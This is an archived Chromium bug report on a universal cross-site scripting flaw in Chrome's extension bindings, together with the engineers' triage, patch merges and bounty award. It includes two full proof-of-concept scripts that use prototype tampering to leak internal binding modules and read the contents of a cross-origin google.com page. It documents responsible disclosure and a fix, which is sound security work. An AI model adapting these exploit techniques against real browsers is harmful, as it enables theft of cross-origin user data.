# Security: Universal XSS in extension bindings

| Field | Value |
|-------|-------|
| **Issue ID** | [40084036](https://issues.chromium.org/issues/40084036) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>Extensions |
| **Reporter** | se...@gmail.com |
| **Assignee** | rd...@chromium.org |
| **Created** | 2016-04-06 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

From src/extensions/renderer/resources/utils.js:47:  

function loadTypeSchema(typeName, defaultSchema) {  

var parts = $String.split(typeName, '.');  

if (parts.length == 1) {  

if (defaultSchema == null) {  

WARNING('Trying to reference "' + typeName + '" ' +  

'with neither namespace nor default schema.');  

return null;  

}  

var types = defaultSchema.types; //\*\*this code path\*\*  

} else {  

var schemaName = $Array.join($Array.slice(parts, 0, parts.length - 1), '.');  

var types = schemaRegistry.GetSchema(schemaName).types;  

}  

for (var i = 0; i < types.length; ++i) {  

if (types[i].id == typeName)  

return types[i];  

}  

return null;  

}

In the repro case for <https://crbug.com/chromium/590275> I've redefined the "utils.loadTypeSchema" function  

to steal the test module bindings. Turns out the same effect can be achieved just by  

choosing the proper values of the |typeName| and |defaultSchema| parameters  

which we control through the "Binding.prototype.generate" call in binding.js.

**VERSION**  

Google Chrome 49.0.2623.110 (Official Build) m (64-bit)  

Google Chrome 51.0.2701.0 (Official Build) canary (64-bit)

**REPRODUCTION CASE**

<body>
<script>
var leakedBinding;
Object.prototype.\_\_defineSetter\_\_("create", function (value) {
leakedBinding = this;
delete Object.prototype.create;
this.create = value;
});
chrome.runtime;

Object.prototype.**defineGetter** = function (name, func) {  

if (name != "isInstalled")  

return;

leakedBinding.prototype.registerCustomHook = function (func) {  

leakedCustomHook = func;  

Object.prototype.test = {};  

};  

leakedBinding.prototype.generate.call({  

schema\_: {  

unprivileged: true,  

namespace: "runtime",  

properties: {  

"lastError": {  

value: {},  

$ref: "foo"  

}  

},  

types: [{  

id: "foo",  

js\_module: "test"  

}]  

}  

});  

};  

try {  

chrome.app;  

} catch (e) {}  

delete Object.prototype.test;  

leakedFuncs = {};  

obj = {  

compiledApi: {},  

apiFunctions: {  

setHandleRequest: function (name, func) {  

leakedFuncs[name] = func;  

}  

}};  

leakedCustomHook(obj);

moduleSystem = leakedFuncs.getModuleSystem(window);  

leakedFuncs.runWithNativesEnabled(function() {  

sendRequest = moduleSystem.requireNative("sendRequest");  

});

frame = document.body.appendChild(document.createElement("iframe"));  

frame.src = "<https://www.google.com/intl/en/ads/>";  

frame.onload = function () {  

loc = frame.contentWindow.location;

frame.src = "data:,foo";  

frame.onload = function () {  

glob = sendRequest.GetGlobal(loc);  

alert(glob.document.body.innerHTML);  

};  

}  

</script>

</body>

--

I would like to remain anonymous for this report.

## Attachments

- [uxss.patch](attachments/uxss.patch) (application/octet-stream, 1.2 KB)

## Timeline

### ke...@chromium.org (2016-04-06)

Thanks for the report.

rdevlin.cronin: Can you take this one?

[Monorail components: Platform>Extensions]

### rd...@chromium.org (2016-04-06)

This is conceptually identical to https://crbug.com/chromium/598165.  There are multiple bugs here which all rely on intercepting bindings to run native code - I've created https://crbug.com/chromium/601149 to track that.

@kenrb, can we go ahead and dup this into 601149 (or 598165)?

### oc...@chromium.org (2016-04-06)

Re #2, I don't think we should dupe this. Since we still need to fix this instance of the bug it would be useful to have separate bugs to track fixes and merges.

### se...@gmail.com (2016-04-08)

rdevlin.cronin: if I understand correctly the current approach to fix this bug is to make
the "test" module hidden behind the command-line switch (I looked at https://codereview.chromium.org/1866103002/
and https://codereview.chromium.org/1843803002/).
I've modified the repro case so it no longer uses the "test" module -- only "sendRequest" and "lastError"
which are both available to a regular page.

<body>
<script>
var leakedBinding;
Object.prototype.__defineSetter__("create", function (value) {
  leakedBinding = this;
  delete Object.prototype.create;
  this.create = value;
});
chrome.runtime;

function leakModule(moduleName) {
  var leakedModule,
  	  obj = {
    schema_: {
      unprivileged: true,
      namespace: "runtime",
      properties: {
        "lastError": {
          get value() {
            Object.prototype.__defineGetter__(moduleName, function () {
            	if (!this.$set)
            		return;

                leakedModule = this;
                delete Object.prototype[moduleName];
                return {};
            });
            return {};
          },
          $ref: "foo"
        }
      },
      types: [{
        id: "foo",
        js_module: moduleName
      }]
    }
  };
  try {
    leakedBinding.prototype.generate.call(obj);
  } catch (e) { }
  return leakedModule;
}

originalDefineGetter = Object.prototype.__defineGetter__;
Object.prototype.__defineGetter__ = function (name, func) {
  if (name != "isInstalled")
    return originalDefineGetter.call(this, name, func);

  sendRequest = leakModule("sendRequest\x00nullbyte");
  // the null byte trick is here because the "sendRequest" object
  // already contains a property with the same name
  lastError = leakModule("lastError");
}
try {
  chrome.app;
} catch (e) { }

frame = document.body.appendChild(document.createElement("iframe"));
frame.src = "https://www.google.com/intl/en/ads/";
frame.onload = function () {
  loc = frame.contentWindow.location;

  frame.src = "data:,foo";
  frame.onload = function () {
    lastError.$set("clear", function (value) {obj = value});
  	Object.prototype.foo = {callback: loc};
  	try {
  	  sendRequest.handleResponse("foo");
  	} catch (e) { }
    alert(obj.constructor.constructor("return document.body.innerHTML")());
  };
}
</script>
</body>

FWIW I have a patch that adds the same access check to SendRequestNatives::GetGlobal
that V8ContextNativeHandler::GetModuleSystem has and it seems to work.

### rd...@chromium.org (2016-04-08)

@4, nice.  That would at least be hindered by https://codereview.chromium.org/1864353002, which makes it a little harder to hijack Binding.prototype.generate to load something random.  But since it's all still in JS, I'm doubt it's foolproof.  The patch to GetGlobal() is a welcome addition.

### sh...@chromium.org (2016-04-23)

rdevlin.cronin: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-05-07)

rdevlin.cronin: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rs...@chromium.org (2016-05-23)

rdevlin: The CL you mention in #5 has landed, but should we also land the SendRequestNatives::GetGlobal patch in #4?

### rd...@chromium.org (2016-05-25)

revision a794ae416acf94cb247d8ca0e8554863f5d9c1d8 performs a similar (and more widely-applying) check, but it looks like I forgot to link this bug in that CL.  It should, though, probably be merged to M51.

### go...@chromium.org (2016-05-25)

Before we approve merge to M51, Could you please confirm whether this change is baked/verified in Canary and safe to merge?

### sh...@chromium.org (2016-05-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-05-26)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-26)

[Automated comment] Less than 2 weeks to go before stable on M51, manual review required.

### rd...@chromium.org (2016-05-26)

revision a794ae416acf94cb247d8ca0e8554863f5d9c1d8 has been in M52 for quite awhile, and has had no issues.

Unfortunately, looking at this closer, that revision uses the ReturnValue::Get() v8 method, which I don't think was added for M51's v8 version.  Our options would be:
- Merge the v8 patch first, as we had to do with other bugs.
- Merge a trimmed down version of revision a794ae416acf94cb247d8ca0e8554863f5d9c1d8, which would still address the immediate concerns but not add as thorough a check.
- Wait for M52.

Jochen, any preference there?

### go...@chromium.org (2016-05-27)

+ timwillis@ (Security TPM), do we need this merge in for next week stable release?

### ti...@google.com (2016-05-27)

I'd like to have the fix in M51, but we can't really make a call until Jochen gets back to us on #14. 

### jo...@chromium.org (2016-05-30)

merging back is fine

### jo...@chromium.org (2016-05-30)

mreged as https://chromium.googlesource.com/v8/v8/+/ea5e96ff05035e5d3fc22ce4df0a9b401c0fae5a

### go...@chromium.org (2016-05-30)

[Comment Deleted]

### go...@chromium.org (2016-05-30)

If M51 is merge is completed, please remove "Merge-Review-51" label and apply appropriate merged label. Thank you

### ti...@google.com (2016-05-31)

Based on #18, removing Merge Review label.

### rd...@chromium.org (2016-06-01)

Note that Jochen's merge was the v8 component.  I'll merge the chromium component now.

### rd...@chromium.org (2016-06-01)

Merged as 913448ac42b4b8bda5aa5fb7e76cbff365453b40.  Hopefully it sticks.

### ti...@google.com (2016-06-06)

Congrats - $7,500 for this one. I'll add it to your tab :)

### ti...@google.com (2016-06-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-21)

This issue was migrated from crbug.com/chromium/601073?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084036)*
